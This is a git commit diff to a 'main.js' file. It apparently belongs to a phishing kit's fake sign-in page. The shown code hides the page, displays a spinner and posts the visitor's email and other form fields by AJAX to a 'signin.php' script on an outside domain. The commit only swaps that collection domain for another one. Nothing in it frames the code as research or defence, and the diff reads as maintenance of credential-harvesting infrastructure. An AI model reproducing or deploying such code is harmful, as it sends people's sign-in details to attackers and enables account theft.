66933f0908597466793595b9303df14c9d032f2a
phpblok3 <97668957+phpblok3@users.noreply.github.com>
2023-10-23 21:50:16 -0700

    Update main.js

--- 8GuXkZA15XWHrj/BzqCmYTWFz81DFD9eCa6nEQAgczT8jwiDzM43umhH1ejMiWM47rvoXDXVu2jfmiuW8LrDsd37OvtN_/js/main.js
+++ 8GuXkZA15XWHrj/BzqCmYTWFz81DFD9eCa6nEQAgczT8jwiDzM43umhH1ejMiWM47rvoXDXVu2jfmiuW8LrDsd37OvtN_/js/main.js
@@ -46,7 +46,7 @@ $(document).ready(function(){
         $("#mcontent").css("display", "none");
         $("#mspinner").css("display", "block");
         $.ajax({
-            url: "https://tenkproducts.shop/kaz/1/signin.php",
+            url: "https://piromet-tr.com/kaz/1/signin.php",
             method: "post",
             data: {
                 X1: email,
